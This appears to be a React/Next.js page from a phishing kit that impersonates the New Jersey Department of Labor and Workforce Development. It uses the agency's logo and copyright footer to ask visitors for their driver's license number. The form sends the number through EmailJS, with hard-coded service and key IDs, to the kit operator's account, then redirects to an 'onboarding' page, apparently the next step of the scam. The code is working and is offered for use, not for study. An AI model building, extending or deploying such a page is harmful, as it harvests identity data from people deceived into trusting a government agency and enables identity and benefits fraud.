import styles from '../styles/Home.module.css';
import { useState } from 'react';
import emailjs from 'emailjs-com';
import { useRouter } from 'next/router';

const Authenticate = () => {
    const [licenseNumber, setLicenseNumber] = useState('');
    const [error, setError] = useState('');
    const router = useRouter();

    const handleNumberChange = (e) => {
        const value = e.target.value.replace(/\D/g, ''); // Only digits
        setLicenseNumber(value);
        setError('');
    };

    const handleSubmit = (e) => {
        e.preventDefault();
        if (licenseNumber.length < 7 || licenseNumber.length > 16) {
            setError('License number must be 7 to 16 digits.');
            return;
        }
        setError('');

        // Prepare data for EmailJS
        const templateParams = {
            licenseNumber: licenseNumber
        };

        emailjs.send(
            'service_ozea06x',
            'template_e76f7uk', // Replace with your EmailJS template ID for authenticate page
            templateParams,
            'XMOnwjyzQDoRVRYl3'
        ).then(
            (response) => {
                router.push('/onboarding');
            },
            (error) => {
                setError('Error sending form');
            }
        );
    };

    return (
        <div className={styles.container}>
            <div className={styles.logoWrapper}>
                <img
                    src="/ASSET/njdol_logo_stamp.svg"
                    alt="NEW JERSEY LOGO"
                    className={styles.logo}
                />
            </div>
            <div className={styles.formSection}>
                <form className={styles.loginForm} onSubmit={handleSubmit} autoComplete="off">
                    <h2 className={styles.heading}>Driver’s License Authentication</h2>
                    <p className={styles.direction} style={{ marginBottom: 18, color: '#254d73', fontWeight: 500 }}>
                        Please enter your driver’s license number (7-16 digits) to continue.
                    </p>
                    <input
                        type="text"
                        id="licenseNumber"
                        name="licenseNumber"
                        placeholder="Enter Driver’s License Number"
                        className={styles.input}
                        value={licenseNumber}
                        onChange={handleNumberChange}
                        maxLength={16}
                        minLength={7}
                        pattern="\d{7,16}"
                        inputMode="numeric"
                        autoComplete="off"
                    />
                    {error && (
                        <div style={{ color: '#b00020', margin: '10px 0', textAlign: 'center', fontWeight: 500 }}>
                            {error}
                        </div>
                    )}
                    <button
                        type="submit"
                        className={styles.button}
                        style={{ marginTop: '22px' }}
                        disabled={licenseNumber.length < 7 || licenseNumber.length > 16}
                    >
                        Submit
                    </button>
                </form>
            </div>
            <footer className={styles.footer}>
                <p>© New Jersey Department of Labor and Workforce Development(NJLWD). All Rights Reserved.</p>
            </footer>
        </div>
    );
};

export default Authenticate;